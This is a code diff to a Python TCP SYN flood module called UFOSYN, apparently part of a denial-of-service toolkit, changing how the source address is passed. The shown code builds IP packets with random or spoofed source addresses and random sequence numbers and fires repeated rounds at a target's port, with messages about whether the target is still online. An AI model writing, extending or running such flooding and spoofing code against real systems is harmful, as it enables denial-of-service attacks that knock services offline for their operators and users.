@@ -32,7 +32,7 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x	
 
-def synize(ip, port, rounds, source_ip = None):
+def synize(ip, port, rounds, address_dict):
     n=0
     try:
         for x in range (0,int(rounds)):
@@ -41,12 +41,12 @@ def synize(ip, port, rounds, source_ip = None):
             seq = randInt()
             window = randInt()
             IP_p = IP()
-            if source_ip is None:
+            if address_dict['source'] is None:
                 print("[Info] [UFOSYN] Using random source IP")
                 IP_p.src = randIP()
             else:
                 print("[Info] [UFOSYN] Using given source IP")
-                IP_p.src = source_ip
+                IP_p.src = address_dict['source']
             try:
                 IP_p.dst = ip
             except:
@@ -68,7 +68,7 @@ def synize(ip, port, rounds, source_ip = None):
         print("[Error] [AI] [UFOSYN] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class UFOSYN(object):
-    def attacking(self, target, rounds, source = None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] TCP SYN Flooder (UFOSYN) is ready to fire: [" , rounds, "quantum hooks ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -92,4 +92,4 @@ class UFOSYN(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [UFOSYN] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        synize(ip, port, rounds, source) # attack with UFOSYN using threading
+        synize(ip, port, rounds, address_dict) # attack with UFOSYN using threading
